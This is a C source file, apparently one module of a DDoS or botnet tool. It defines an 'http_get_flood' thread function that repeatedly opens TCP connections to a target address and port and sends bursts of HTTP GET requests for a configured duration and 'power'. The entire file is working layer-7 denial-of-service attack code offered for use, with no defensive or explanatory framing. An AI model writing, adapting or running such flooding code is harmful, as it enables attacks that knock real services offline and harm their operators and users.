#define _GNU_SOURCE

#include <sys/sysinfo.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include "attack.h"

void *http_get_flood(void *arg)
{
    l7_attack *a = (l7_attack *)arg;
    time_t start = time(NULL);

    while (time(NULL) - start < a->time)
    {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1)
            continue;

        struct sockaddr_in *server = malloc(sizeof(struct sockaddr_in));
        if (server == NULL)
            continue;

        server->sin_family = AF_INET;
        server->sin_port = htons(a->port);
        server->sin_addr.s_addr = inet_addr(a->address);

        if (connect(sock, (struct sockaddr *)server, sizeof(struct sockaddr_in)) == -1)
            continue;

        char *request = NULL;
        if (asprintf(&request, "GET %s HTTP/1.1\r\nHost: %s:%d\r\n\r\n", a->path, a->address, a->port) == -1)
            continue;

        for (int i = 0; i < a->power; i++)
            if (send(sock, request, strlen(request), 0) == -1)
                break;

        free(request);
        free(server);
        close(sock);
    }
}
